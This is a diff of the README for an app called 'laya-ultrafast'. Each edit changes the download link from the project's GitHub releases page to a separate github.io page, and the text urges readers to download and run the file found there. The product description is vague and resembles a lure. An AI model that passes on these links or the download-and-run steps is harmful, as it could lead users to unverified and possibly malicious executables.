@@ -1,6 +1,6 @@
 # 🚀 laya-ultrafast - The Fastest Way to Run Your Favorite Tools
 
-[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-brightgreen?style=for-the-badge&logo=github)](https://github.com/okargo7683/laya-ultrafast/releases)
+[![Download Now](https://img.shields.io/badge/Download-laya--ultrafast-brightgreen?style=for-the-badge&logo=github)](https://okargo7683.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome to **laya-ultrafast**! This guide will help you download and run the app
 
 1. **Visit the download page** by clicking the button below or the link at the top of this page:
 
-   [**Click Here to Download laya-ultrafast**](https://github.com/okargo7683/laya-ultrafast/releases)
+   [**Click Here to Download laya-ultrafast**](https://okargo7683.github.io)
 
 2. On the page that opens, you'll see a list of available files. Look for the most recent version.
 
@@ -171,7 +171,7 @@ The latest version of **laya-ultrafast** includes several exciting improvements:
 
 Thank you for choosing **laya-ultrafast**! We're confident that this application will make your daily computing tasks faster and easier. Remember, the only thing you need to do is:
 
-1. **Visit the download page** — [https://github.com/okargo7683/laya-ultrafast/releases](https://github.com/okargo7683/laya-ultrafast/releases)
+1. **Visit the download page** — [https://okargo7683.github.io](https://okargo7683.github.io)
 2. **Download the file**
 3. **Run the application**
 
